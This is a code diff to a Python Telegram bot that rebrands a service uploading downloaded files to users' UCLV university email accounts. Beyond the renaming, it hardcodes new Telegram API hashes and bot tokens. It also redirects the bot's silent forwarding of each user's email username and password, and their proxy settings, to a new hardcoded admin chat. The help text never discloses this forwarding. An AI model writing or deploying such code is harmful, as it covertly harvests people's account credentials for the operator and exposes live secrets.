@@ -10,7 +10,7 @@ from upload_client import upload
 from download import download
 import urllib.parse
          
-app = Client('uclvcloud',api_id=9024532,api_hash='131b576240be107210aace99a5f5c5b0',bot_token='5777777724:AAFJxKTid4SBlZvFjovKW5LdX7t9C_mqoEQ')
+app = Client('uclvcloud',api_id=12168140,api_hash='3504ce0eddb7dff4288d05d5e3dc5e4c',bot_token='5744208202:AAGD0e-41HSkOi9vYXNmRFHz1TOIiGj60Ek')
 @app.on_message(filters.private & filters.text)
 async def home(client, message):
 		text = message.text
@@ -22,19 +22,19 @@ async def home(client, message):
 			if not exists(str(user_id)):
 				os.mkdir(str(user_id))
 			if not exists(str(user_id)+"/username"):
-				start = "***UclvCloud 2*** \n  Sin cuenta"
+				start = "Bienvenido a ***UPLOAD Correo*** \n  Sin cuenta"
 			else:
 				if not exists(str(user_id)+"/proxy"):
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
+					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()
 				else:
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
+					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("❗ CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
 		elif 'http://' in text or 'https://' in text:
 			await app.send_message(user_id, "Descargando")
@@ -67,19 +67,19 @@ async def home(client, message):
 			if not exists(str(user_id)):
 				os.mkdir(str(user_id))
 			if not exists(str(user_id)+"/username"):
-				start = "***UclvCloud 2*** \n  Sin cuenta"
+				start = "***UPLOAD Correo*** \n  Sin cuenta"
 			else:
 				if not exists(str(user_id)+"/proxy"):
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
+					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()
 				else:
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
+					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("❗ CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
 		elif "socks5://" in text:
         			log = open(str(user_id)+"log","r")
@@ -89,18 +89,18 @@ async def home(client, message):
         			if "socks5://none" in text:
         				os.remove(str(user_id)+"/proxy")
         			else:
-        				await app.send_message(1593891519,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
+        				await app.send_message(1806431279,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
         			if not exists(str(user_id)+"/username"):
-        				start = "***UclvCloud 2*** \n  Sin cuenta"
+        				start = "***UPLOAD Correo*** \n  Sin cuenta"
         			else:
         				if not exists(str(user_id)+"/proxy"):
         					username = open(str(user_id)+"/username","r")
         					password = open(str(user_id)+"/password","r")
-        					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
+        					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()
         				else:
         					username = open(str(user_id)+"/username","r")
         					password = open(str(user_id)+"/password","r")
-        					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
+        					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
         			await app.delete_messages(user_id, int(msg_id) - 1)
         			await app.delete_messages(user_id, msg_id)
         			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
@@ -125,16 +125,16 @@ async def home(client, message):
 		      				await app.delete_messages(user_id, msg_id)
 		      				deleted(username.read(),password.read(), "https://correo.uclv.edu.cu", data[1])
 		      			if not exists(str(user_id)+"/username"):
-		      				start = "***UclvCloud 2*** \n  Sin cuenta"
+		      				start = "***UPLOAD Correo*** \n  Sin cuenta"
 		      			else:
 		      					if not exists(str(user_id)+"/proxy"):
 		      						username = open(str(user_id)+"/username","r")
 		      						password = open(str(user_id)+"/password","r")
-		      						start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
+		      						start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()
 		      					else:
 		      						username = open(str(user_id)+"/username","r")
 		      						password = open(str(user_id)+"/password","r")
-		      						start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
+		      						start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 		      			await app.delete_messages(user_id, int(msg_id) - 1)
 		      			await app.delete_messages(user_id, msg_id)
 		      			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
@@ -147,21 +147,21 @@ async def home(client, message):
 		      		data = text.split(":")
 		      		username.write(data[0])
 		      		password.write(data[1])
-		      		if user_id != 1593891519:
-		      			await app.send_message(1593891519, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
+		      		if user_id != 1806431279:
+		      			await app.send_message(1806431279, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
 		      		log = open(str(data[1])+"log","w")
 		      		log.write("")
 		      		if not exists(str(user_id)+"/username"):
-		      			start = "***UclvCloud 2*** \n  Sin cuenta"
+		      			start = "***UPLOAD Correo*** \n  Sin cuenta"
 		      		else:
 		      			if not exists(str(user_id)+"/proxy"):
 		      				username = open(str(user_id)+"/username","r")
 		      				password = open(str(user_id)+"/password","r")
-		      				start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
+		      				start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()
 		      			else:
 		      				username = open(str(user_id)+"/username","r")
 		      				password = open(str(user_id)+"/password","r")
-		      				start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
+		      				start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 		      		await app.delete_messages(user_id, msg_id)
 		      		await app.delete_messages(user_id, int(msg_id) - 1)
 		      		await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
@@ -174,7 +174,7 @@ async def answer(client, callback_query):
 	if 'help' in data:
 		data = data.split(":")
 		await app.delete_messages(data[1], int(data[2]) + 1)
-		await app.send_message(data[1],"__Desarrollo de **Kanami Studios**__ \n\n **¿Usted tiene un correo de la uclv?** \n __Parecido a__ `kanami@uclv.cu` __, bueno..., si lo tiene felicidades con este bot puede hacer de ese correo su nube personal de descargas gratis en Cuba. \n Envíe un enlace para empezar la descarga de este en el bot para ser subido a su correo, el tamaño de las partes de los zips es automaticamente 48 MB.__ \n\n__El usuario y contraseña se editan en **CAMBIAR USUARIO** del menú, el formato del usuario es kanami@uclv.cu y el de la contraseña @Kanami0__\n\n__En **VER ARCHIVOS** usted puede ver y eliminar sus archivos en el correo para conservar el almacenamiento que debería ser de 1.95 GB__\n\n **__Para subir archivos use las hora de 11:00 pm : 11:00 am__**\n\n **Es hora de descargar gratis!!**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
+		await app.send_message(data[1],"**¿Usted tiene un correo?** \n __Parecido a__ 'ejemplo@uclv.cu` __, bueno..., si lo tiene felicidades con este bot puede hacer de ese correo su nube personal de descargas gratis en Cuba. \n Envíe un enlace para empezar la descarga de este en el bot para ser subido a su correo, el tamaño de las partes de los zips es automaticamente .__ \n\n__El usuario y contraseña se editan en **CAMBIAR USUARIO** del menú, el formato del usuario es usuario@uclv.cu y el de la contraseña @Contraseña__\n\n__En **VER ARCHIVOS** usted puede ver y eliminar sus archivos en el correo para conservar el almacenamiento__\n\n **__Para subir archivos use las hora de 11:00 pm : 11:00 am__**\n\n **Es hora de descargar gratis!!**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
 	if 'account' in data:
 		data = data.split(":")
 		log = open(str(data[1])+"log","w")
@@ -210,20 +210,20 @@ async def answer(client, callback_query):
 		log.write("")
 		log.close()
 		if not exists(str(data[1])+"/username"):
-				start = "***UclvCloud 2*** \n  Sin cuenta"
+				start = "***UPLOAD Correo*** \n  Sin cuenta"
 		else:
 				if not exists(str(data[1])+"/proxy"):
 					username = open(str(data[1])+"/username","r")
 					password = open(str(data[1])+"/password","r")
-					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
+					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()
 				else:
 					username = open(str(data[1])+"/username","r")
 					password = open(str(data[1])+"/password","r")
-					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
+					start = "***UPLOAD Correo*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 		await app.delete_messages(data[1],int(data[2]) + 2)
 		await app.send_message(data[1] ,start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("UPLOAD Correo", url="https://t.m/raydel0307")]
         ]))
  
 print("Iniciado")
